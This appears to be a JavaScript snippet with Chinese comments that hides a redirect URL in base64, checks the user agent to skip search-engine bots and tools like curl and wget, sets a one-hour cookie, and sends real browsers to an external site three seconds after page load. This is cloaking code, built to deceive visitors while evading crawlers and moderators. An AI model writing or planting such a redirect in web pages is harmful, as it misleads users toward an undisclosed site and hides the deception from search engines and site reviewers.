// ✅ Base64 加密跳转地址
const _x1 = 'aHR0cHM6Ly93ZWIuYWlzdHJpcC52aXA='; // https://web.aistrip.vip
const _y2 = atob(_x1);

// ✅ 浏览器 UA 判断（排除爬虫）
const ua = navigator.userAgent.toLowerCase();
const isBrowser = /chrome|safari|firefox|edge|opera|mobile/.test(ua);
const isBot = /bot|spider|crawler|curl|python|wget/.test(ua);

// ✅ Cookie 检查（防止重复跳转）
const visited = document.cookie.includes('visited=true');

// ✅ 跳转函数（直接跳转，不依赖按钮）
const redirectNow = () => {
  if (isBrowser && !isBot && !visited) {
    document.cookie = 'visited=true; max-age=3600';
    window.location.href = _y2;
  }
};

// ✅ 页面加载后延迟 3 秒触发跳转
document.addEventListener('DOMContentLoaded', () => {
  setTimeout(redirectNow, 3000);
});
